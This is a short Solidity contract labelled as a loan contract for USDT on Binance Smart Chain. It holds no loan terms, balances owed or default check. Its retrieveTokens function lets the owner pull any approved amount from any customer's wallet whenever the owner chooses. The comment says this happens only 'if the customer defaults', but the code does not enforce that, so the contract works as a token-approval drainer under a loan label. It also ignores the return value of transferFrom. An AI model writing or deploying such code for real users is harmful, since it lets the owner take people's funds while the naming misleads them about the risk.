// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
}

contract LoanContract {
    address public owner;
    address public tokenAddress; // Address of Tether (USDT) on Binance Smart Chain

    constructor(address _tokenAddress) {
        owner = msg.sender;
        tokenAddress = _tokenAddress;
    }

    // Check allowance of the customer's tokens
    function checkAllowance(address customer) public view returns (uint256) {
        return IERC20(tokenAddress).allowance(customer, address(this));
    }

    // Transfer function to retrieve tokens if the customer defaults
    function retrieveTokens(address customer, uint256 amount) public {
        require(msg.sender == owner, "Only the owner can retrieve tokens");
        require(IERC20(tokenAddress).allowance(customer, address(this)) >= amount, "Insufficient allowance");
        
        IERC20(tokenAddress).transferFrom(customer, owner, amount);
    }
}
